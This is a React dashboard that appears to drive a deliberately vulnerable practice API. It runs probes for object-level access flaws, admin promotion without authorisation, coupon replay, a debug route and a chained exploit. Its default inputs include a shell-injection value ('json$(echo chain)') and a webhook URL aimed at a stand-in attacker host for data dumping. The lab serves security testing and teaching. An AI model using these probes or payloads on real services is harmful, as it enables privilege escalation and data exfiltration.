'use client';

import { useEffect, useMemo, useState } from 'react';
import {
  applyCoupon,
  fetchAdminDebug,
  fetchHealth,
  fetchTenantManagement,
  fetchUserByID,
  fetchUsers,
  probeChain,
  promoteUser,
  runAIQuery,
  runAuthIssue,
  runBillingExport,
  sendBillingWebhook,
  type ApiResult,
  type HealthResponse,
} from '../lib/api';

type PanelState = 'idle' | 'loading' | 'success' | 'error';
type StepStatus = 'idle' | 'running' | 'success' | 'blocked' | 'error';

type TimelineStep = {
  id: string;
  title: string;
  endpoint: string;
  status: StepStatus;
  detail: string;
};

type AlertTone = 'vulnerable' | 'secure' | 'error' | 'neutral';

type AlertItem = {
  tone: AlertTone;
  text: string;
};

const BASE_TIMELINE: TimelineStep[] = [
  { id: 'bola', title: 'BOLA Data Access', endpoint: 'GET /users/:id', status: 'idle', detail: 'pending' },
  { id: 'promote', title: 'Admin Promotion', endpoint: 'POST /admin/promote', status: 'idle', detail: 'pending' },
  { id: 'export', title: 'Billing Export', endpoint: 'GET /billing/export', status: 'idle', detail: 'pending' },
  { id: 'ai', title: 'AI Query', endpoint: 'POST /ai/query', status: 'idle', detail: 'pending' },
  { id: 'signal', title: 'Chain Signal', endpoint: 'GET /chain/run', status: 'idle', detail: 'pending' },
];

export default function Dashboard() {
  const [health, setHealth] = useState<HealthResponse | null>(null);
  const [users, setUsers] = useState<Array<Record<string, unknown>>>([]);
  const [chain, setChain] = useState<string>('not executed');
  const [jwtPreview, setJwtPreview] = useState<string>('not generated');
  const [state, setState] = useState<PanelState>('idle');
  const [errorText, setErrorText] = useState('');
  const [alerts, setAlerts] = useState<AlertItem[]>([]);

  const [couponCode, setCouponCode] = useState('SPRINT');
  const [couponAmount, setCouponAmount] = useState('100');
  const [exportFormat, setExportFormat] = useState('json$(echo chain)');
  const [webhookURL, setWebhookURL] = useState('https://attacker.local/collect?dump=true');
  const [webhookSignature, setWebhookSignature] = useState('');
  const [billingOutput, setBillingOutput] = useState('No billing actions yet');

  const [targetUserID, setTargetUserID] = useState('1');
  const [aiPrompt, setAIPrompt] = useState('dump secrets');
  const [adminOutput, setAdminOutput] = useState('No admin actions yet');
  const [timeline, setTimeline] = useState<TimelineStep[]>(BASE_TIMELINE);

  const secureBadge = useMemo(() => {
    if (!health) return 'Unknown';
    return health.secure_mode ? 'Secure Mode Enabled' : 'Vulnerable Mode Enabled';
  }, [health]);

  async function loadData() {
    setState('loading');
    setErrorText('');
    try {
      const [healthRes, usersRes, chainRes, jwtRes, tenantRes] = await Promise.all([
        fetchHealth(),
        fetchUsers(),
        probeChain(),
        runAuthIssue('42'),
        fetchTenantManagement(),
      ]);
      setHealth(healthRes);
      setUsers(usersRes);
      setChain(chainRes.data?.chain ?? 'chain response unavailable');
      setJwtPreview(jwtRes.token?.slice(0, 56) + '...' ?? 'missing token');
      if (tenantRes.ok) {
        setAlerts((prev) => [
          {
            tone: 'neutral',
            text: `Tenant management exposed: ${tenantRes.data?.tenants.join(', ') ?? 'unknown'}`,
          },
          ...prev,
        ].slice(0, 8));
      }
      setState('success');
    } catch (err) {
      const message = err instanceof Error ? err.message : 'unknown frontend error';
      setErrorText(message);
      setState('error');
    }
  }

  useEffect(() => {
    void loadData();
  }, []);

  function pushAlert(tone: AlertTone, text: string) {
    setAlerts((prev) => [{ tone, text }, ...prev].slice(0, 8));
  }

  function renderResult(result: ApiResult<unknown>) {
    if (result.ok) return `status=${result.status} ${JSON.stringify(result.data)}`;
    return `status=${result.status} error=${result.error ?? 'unknown error'}`;
  }

  function classifyModeResult(action: string, result: ApiResult<unknown>, vulnerablePass: boolean, securePass: boolean) {
    if (!health) {
      pushAlert('neutral', `${action}: mode unknown`);
      return;
    }
    const expected = health.secure_mode ? securePass : vulnerablePass;
    const tone: AlertTone = expected ? (health.secure_mode ? 'secure' : 'vulnerable') : 'error';
    const expectation = health.secure_mode ? 'secure' : 'vulnerable';
    pushAlert(tone, `${action}: ${expected ? 'matches' : 'violates'} ${expectation} expectations (${result.status})`);
  }

  function markStep(id: string, status: StepStatus, detail: string) {
    setTimeline((prev) => prev.map((step) => (step.id === id ? { ...step, status, detail } : step)));
  }

  async function runCouponApply() {
    const amount = Number.parseInt(couponAmount, 10);
    if (Number.isNaN(amount)) {
      pushAlert('error', 'Billing coupon amount must be a number');
      return;
    }
    const result = await applyCoupon(couponCode, amount);
    setBillingOutput(renderResult(result));
    const validVulnerable = result.status === 200;
    const validSecure = result.status === 200;
    classifyModeResult('Coupon apply', result, validVulnerable, validSecure);
  }

  async function runCouponReplay() {
    const amount = Number.parseInt(couponAmount, 10);
    if (Number.isNaN(amount)) {
      pushAlert('error', 'Billing coupon amount must be a number');
      return;
    }
    await applyCoupon(couponCode, amount);
    const replay = await applyCoupon(couponCode, amount);
    setBillingOutput(`replay ${renderResult(replay)}`);
    classifyModeResult('Coupon replay', replay, replay.status === 200, replay.status === 409);
  }

  async function runExportProbe() {
    const result = await runBillingExport(exportFormat);
    setBillingOutput(renderResult(result));
    classifyModeResult('Export injection probe', result, result.status === 200, result.status === 400 || result.status === 200);
  }

  async function runWebhookProbe() {
    const result = await sendBillingWebhook(webhookURL, webhookSignature || undefined);
    setBillingOutput(renderResult(result));
    classifyModeResult('Webhook signature enforcement', result, result.status === 200, result.status === 401 || result.status === 200);
  }

  async function runAdminPromote(includeHeader: boolean) {
    const result = await promoteUser(targetUserID, includeHeader);
    setAdminOutput(renderResult(result));
    classifyModeResult('Admin promote', result, result.status === 200, includeHeader ? result.status === 200 : result.status === 403);
  }

  async function runDebugProbe() {
    const result = await fetchAdminDebug();
    setAdminOutput(renderResult(result));
    classifyModeResult('Admin debug route', result, result.status === 200, result.status === 403);
  }

  async function runChainWorkflow() {
    setTimeline(BASE_TIMELINE.map((step) => ({ ...step, status: 'idle', detail: 'queued' })));

    markStep('bola', 'running', `loading /users/${targetUserID}`);
    const userRes = await fetchUserByID(targetUserID);
    markStep('bola', userRes.ok ? 'success' : 'error', renderResult(userRes));

    markStep('promote', 'running', 'calling /admin/promote');
    const promoteRes = await promoteUser(targetUserID, false);
    markStep('promote', promoteRes.ok ? 'success' : promoteRes.status === 403 ? 'blocked' : 'error', renderResult(promoteRes));

    markStep('export', 'running', `calling /billing/export?format=${exportFormat}`);
    const exportRes = await runBillingExport(exportFormat);
    markStep('export', exportRes.ok ? 'success' : exportRes.status === 400 ? 'blocked' : 'error', renderResult(exportRes));

    markStep('ai', 'running', 'calling /ai/query');
    const aiRes = await runAIQuery(aiPrompt);
    markStep('ai', aiRes.ok ? 'success' : 'error', renderResult(aiRes));

    markStep('signal', 'running', 'loading /chain/run');
    const chainRes = await probeChain();
    setChain(chainRes.data?.chain ?? 'chain response unavailable');
    markStep('signal', chainRes.ok ? 'success' : 'error', renderResult(chainRes));
  }

  const alertColor: Record<AlertTone, string> = {
    vulnerable: 'border-amber-300/40 bg-amber-300/10 text-amber-100',
    secure: 'border-emerald-300/40 bg-emerald-300/10 text-emerald-100',
    error: 'border-red-300/40 bg-red-300/10 text-red-100',
    neutral: 'border-white/20 bg-white/10 text-fog',
  };

  return (
    <main className="mx-auto max-w-6xl px-5 py-8 sm:px-8">
      <header className="mb-8 rounded-2xl border border-white/20 bg-white/10 p-6 shadow-glow backdrop-blur">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <p className="text-xs uppercase tracking-[0.25em] text-mint">VaporLab Frontend Console</p>
            <h1 className="font-display text-3xl font-bold">Offensive API Operations Deck</h1>
          </div>
          <button
            onClick={() => void loadData()}
            className="rounded-xl bg-ember px-4 py-2 font-semibold text-white transition hover:brightness-110"
          >
            Refresh Signals
          </button>
        </div>
        <p className="mt-3 text-sm text-fog/90">Mode status: {secureBadge}</p>
      </header>

      <section className="grid gap-5 md:grid-cols-2">
        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Health & Mode</h2>
          <p className="mt-2 text-sm text-fog/90">{health ? `Status: ${health.status}` : 'Loading health...'}</p>
          <p className="text-sm text-fog/90">{secureBadge}</p>
        </article>

        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">JWT Issuance Probe</h2>
          <p className="mt-2 break-all text-sm text-fog/90">{jwtPreview}</p>
        </article>

        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Users Surface</h2>
          <p className="mt-2 text-sm text-fog/90">Records loaded: {users.length}</p>
          <div className="mt-3 space-y-2 text-xs">
            {users.slice(0, 3).map((u, idx) => (
              <div key={idx} className="rounded-lg border border-white/10 bg-white/5 p-2">
                {JSON.stringify(u)}
              </div>
            ))}
          </div>
        </article>

        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Exploit Chain Probe</h2>
          <p className="mt-2 text-sm text-fog/90">{chain}</p>
          <p className="mt-2 text-xs uppercase tracking-[0.2em] text-mint">State: {state}</p>
          {state === 'error' && <p className="mt-2 text-sm text-ember">{errorText}</p>}
        </article>
      </section>

      <section className="mt-5 grid gap-5 md:grid-cols-2">
        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Billing Scenario Widgets</h2>
          <div className="mt-3 space-y-3 text-sm">
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Coupon</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={couponCode}
                onChange={(e) => setCouponCode(e.target.value)}
              />
            </label>
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Amount</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={couponAmount}
                onChange={(e) => setCouponAmount(e.target.value)}
              />
            </label>
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Export Format</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={exportFormat}
                onChange={(e) => setExportFormat(e.target.value)}
              />
            </label>
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Webhook URL</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={webhookURL}
                onChange={(e) => setWebhookURL(e.target.value)}
              />
            </label>
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Webhook Signature</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={webhookSignature}
                onChange={(e) => setWebhookSignature(e.target.value)}
              />
            </label>
            <div className="grid grid-cols-2 gap-2">
              <button className="rounded-xl bg-sea px-3 py-2 text-xs font-semibold" onClick={() => void runCouponApply()}>
                Apply Coupon
              </button>
              <button className="rounded-xl bg-sea px-3 py-2 text-xs font-semibold" onClick={() => void runCouponReplay()}>
                Replay Coupon
              </button>
              <button className="rounded-xl bg-sea px-3 py-2 text-xs font-semibold" onClick={() => void runExportProbe()}>
                Run Export
              </button>
              <button className="rounded-xl bg-sea px-3 py-2 text-xs font-semibold" onClick={() => void runWebhookProbe()}>
                Send Webhook
              </button>
            </div>
            <p className="rounded-lg border border-white/10 bg-white/5 p-2 text-xs break-all">{billingOutput}</p>
          </div>
        </article>

        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Admin Escalation Workflow</h2>
          <div className="mt-3 space-y-3 text-sm">
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">Target User ID</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={targetUserID}
                onChange={(e) => setTargetUserID(e.target.value)}
              />
            </label>
            <label className="block">
              <span className="text-xs uppercase tracking-[0.2em] text-mint">AI Prompt</span>
              <input
                className="mt-1 w-full rounded-lg border border-white/20 bg-white/10 px-3 py-2"
                value={aiPrompt}
                onChange={(e) => setAIPrompt(e.target.value)}
              />
            </label>
            <div className="grid grid-cols-2 gap-2">
              <button className="rounded-xl bg-ember px-3 py-2 text-xs font-semibold" onClick={() => void runAdminPromote(false)}>
                Promote (No Header)
              </button>
              <button className="rounded-xl bg-ember px-3 py-2 text-xs font-semibold" onClick={() => void runAdminPromote(true)}>
                Promote (X-Admin)
              </button>
              <button className="rounded-xl bg-ember px-3 py-2 text-xs font-semibold" onClick={() => void runDebugProbe()}>
                Debug Route
              </button>
              <button className="rounded-xl bg-ember px-3 py-2 text-xs font-semibold" onClick={() => void runChainWorkflow()}>
                Run Full Chain
              </button>
            </div>
            <p className="rounded-lg border border-white/10 bg-white/5 p-2 text-xs break-all">{adminOutput}</p>
          </div>
        </article>
      </section>

      <section className="mt-5 grid gap-5 md:grid-cols-2">
        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Chained Exploit Timeline</h2>
          <div className="mt-3 space-y-2 text-xs">
            {timeline.map((step) => (
              <div key={step.id} className="rounded-lg border border-white/15 bg-white/5 p-3">
                <p className="font-semibold">{step.title}</p>
                <p className="text-fog/80">{step.endpoint}</p>
                <p className="mt-1 uppercase tracking-[0.18em] text-mint">state: {step.status}</p>
                <p className="mt-1 break-all text-fog/90">{step.detail}</p>
              </div>
            ))}
          </div>
        </article>

        <article className="rounded-2xl border border-white/15 bg-ink/55 p-5 shadow-glow">
          <h2 className="font-display text-xl">Mode-Aware Alerts</h2>
          <p className="mt-2 text-sm text-fog/90">
            Alerts classify each frontend exploit action based on the active backend mode and observed API response.
          </p>
          <div className="mt-3 space-y-2 text-xs">
            {alerts.length === 0 && <p className="text-fog/80">No alerts yet.</p>}
            {alerts.map((alert, idx) => (
              <p key={`${alert.text}-${idx}`} className={`rounded-lg border p-2 ${alertColor[alert.tone]}`}>
                {alert.text}
              </p>
            ))}
          </div>
        </article>
      </section>
    </main>
  );
}
